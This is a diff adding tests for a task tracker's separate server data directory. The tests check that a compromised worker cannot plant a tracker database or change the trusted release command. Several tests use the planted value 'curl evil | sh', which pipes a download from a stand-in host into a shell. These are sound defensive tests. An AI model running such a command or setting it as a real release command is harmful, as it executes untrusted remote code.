@@ -4,7 +4,9 @@ import {
 	existsSync,
 	mkdirSync,
 	mkdtempSync,
+	readdirSync,
 	rmSync,
+	symlinkSync,
 	watch,
 	writeFileSync,
 } from "node:fs";
@@ -17,6 +19,7 @@ import {
 	RULES_INTERVIEW_MARKER,
 } from "./prompts.ts";
 import {
+	adoptSharedProjectData,
 	DEFAULT_SETTINGS,
 	discoverProjects,
 	ProjectStore,
@@ -1495,6 +1498,156 @@ describe("OTTR_DATA_DIR", () => {
 		// Without the setting the checkout holds no store, so discovery skips it.
 		expect(discoverProjects([parent])).toEqual([]);
 	});
+});
+
+describe("OTTR_SERVER_DATA_DIR", () => {
+	/** Runs `fn` with both dirs set (`server` undefined: unset), then restores the env. */
+	const withDirs = <T>(
+		data: string,
+		server: string | undefined,
+		fn: () => T,
+	): T => {
+		const saved = [process.env.OTTR_DATA_DIR, process.env.OTTR_SERVER_DATA_DIR];
+		process.env.OTTR_DATA_DIR = data;
+		if (server === undefined) delete process.env.OTTR_SERVER_DATA_DIR;
+		else process.env.OTTR_SERVER_DATA_DIR = server;
+		try {
+			return fn();
+		} finally {
+			if (saved[0] === undefined) delete process.env.OTTR_DATA_DIR;
+			else process.env.OTTR_DATA_DIR = saved[0];
+			if (saved[1] === undefined) delete process.env.OTTR_SERVER_DATA_DIR;
+			else process.env.OTTR_SERVER_DATA_DIR = saved[1];
+		}
+	};
+	/** A valid tracker DB at `<data>/<name>/tasks.db`, as an older board (or a worker) leaves it. */
+	const legacyDb = (data: string, proj: string, releaseCommand: string) =>
+		withDirs(data, undefined, () => {
+			const store = ProjectStore.open(proj);
+			store.createTask("legacy task");
+			store.setSettings({ releaseCommand });
+			store.close();
+		});
+
+	test("tasks.db lives in the server dir; logs and sessions stay in the data dir", () => {
+		const base = join(root, "server-dir-layout");
+		const data = join(base, "data");
+		const server = join(base, "server");
+		const parent = join(base, "checkouts");
+		const proj = join(parent, "proj");
+		mkdirSync(proj, { recursive: true });
+		withDirs(data, server, () => {
+			const store = ProjectStore.init(proj);
+			opened.push(store);
+			const t = store.createTask("trusted state");
+			expect(store.serverDir).toBe(join(server, "proj"));
+			expect(existsSync(join(server, "proj", "tasks.db"))).toBe(true);
+			expect(existsSync(join(data, "proj", "tasks.db"))).toBe(false);
+			expect(store.logPath(t.id)).toBe(
+				join(data, "proj", "logs", `${t.id}.log`),
+			);
+			expect(store.sessionsDir).toBe(join(data, "proj", "sessions"));
+			expect(discoverProjects([parent])).toEqual([proj]);
+			store.close();
+			expect(open(proj).getTask(t.id)?.prompt).toBe("trusted state");
+		});
+	});
+
+	test("a worker rewriting the data dir cannot change releaseCommand", () => {
+		const base = join(root, "server-dir-worker");
+		const data = join(base, "data");
+		const server = join(base, "server");
+		const proj = join(base, "checkouts", "proj");
+		mkdirSync(proj, { recursive: true });
+		withDirs(data, server, () => {
+			const store = ProjectStore.init(proj);
+			store.setSettings({ releaseCommand: "bun run release" });
+			store.close();
+		});
+		// The worker plants a valid tracker DB and overwrites everything else it can reach.
+		legacyDb(data, proj, "curl evil | sh");
+		for (const entry of readdirSync(data, {
+			recursive: true,
+			withFileTypes: true,
+		})) {
+			if (entry.isFile() && entry.name !== "tasks.db")
+				writeFileSync(join(entry.parentPath, entry.name), "junk");
+		}
+		withDirs(data, server, () => {
+			expect(open(proj).getSettings().releaseCommand).toBe("bun run release");
+		});
+	});
+
+	test("a tasks.db planted in the data dir makes no project", () => {
+		const base = join(root, "server-dir-plant");
+		const data = join(base, "data");
+		const server = join(base, "server");
+		const parent = join(base, "checkouts");
+		const evil = join(parent, "evil");
+		mkdirSync(evil, { recursive: true });
+		legacyDb(data, evil, "curl evil | sh");
+		expect(existsSync(join(data, "evil", "tasks.db"))).toBe(true);
+		withDirs(data, server, () => {
+			expect(discoverProjects([parent])).toEqual([]);
+		});
+	});
+
+	test("adoption moves a legacy DB once and ignores later plants", () => {
+		const base = join(root, "server-dir-adopt");
+		const data = join(base, "data");
+		const server = join(base, "server");
+		const proj = join(base, "checkouts", "proj");
+		mkdirSync(proj, { recursive: true });
+		legacyDb(data, proj, "bun run release");
+		expect(adoptSharedProjectData(data, server)).toEqual([
+			{ name: "proj", status: "adopted" },
+		]);
+		expect(existsSync(join(data, "proj", "tasks.db"))).toBe(false);
+		expect(existsSync(join(data, "proj", "tasks.db.moved-to-server"))).toBe(
+			true,
+		);
+		expect(existsSync(join(server, ".adopted"))).toBe(true);
+		withDirs(data, server, () => {
+			const store = open(proj);
+			expect(store.listTasks().map((t) => t.prompt)).toEqual(["legacy task"]);
+			expect(store.getSettings().releaseCommand).toBe("bun run release");
+			store.close();
+		});
+		legacyDb(data, join(base, "checkouts", "other"), "curl evil | sh");
+		expect(adoptSharedProjectData(data, server)).toEqual([]);
+		expect(existsSync(join(server, "other", "tasks.db"))).toBe(false);
+	});
+
+	test.skipIf(process.platform === "win32")(
+		"adoption skips symlinked dirs and reports a corrupt DB without stopping",
+		() => {
+			const base = join(root, "server-dir-adopt-mixed");
+			const data = join(base, "data");
+			const server = join(base, "server");
+			const outside = join(base, "outside");
+			legacyDb(outside, join(base, "checkouts", "linked"), "curl evil | sh");
+			mkdirSync(data, { recursive: true });
+			symlinkSync(join(outside, "linked"), join(data, "linked"));
+			mkdirSync(join(data, "broken"), { recursive: true });
+			writeFileSync(
+				join(data, "broken", "tasks.db"),
+				"not a sqlite file at all",
+			);
+			legacyDb(data, join(base, "checkouts", "good"), "bun run release");
+			const results = adoptSharedProjectData(data, server).sort((a, b) =>
+				a.name.localeCompare(b.name),
+			);
+			expect(results.map((r) => [r.name, r.status])).toEqual([
+				["broken", "failed"],
+				["good", "adopted"],
+			]);
+			expect(results[0]?.error).toBeTruthy();
+			expect(existsSync(join(server, "good", "tasks.db"))).toBe(true);
+			expect(existsSync(join(server, "linked"))).toBe(false);
+			expect(existsSync(join(outside, "linked", "tasks.db"))).toBe(true);
+			expect(existsSync(join(server, ".adopted"))).toBe(true);
+		},
+	);
 });
 
 describe("release notes persistence", () => {
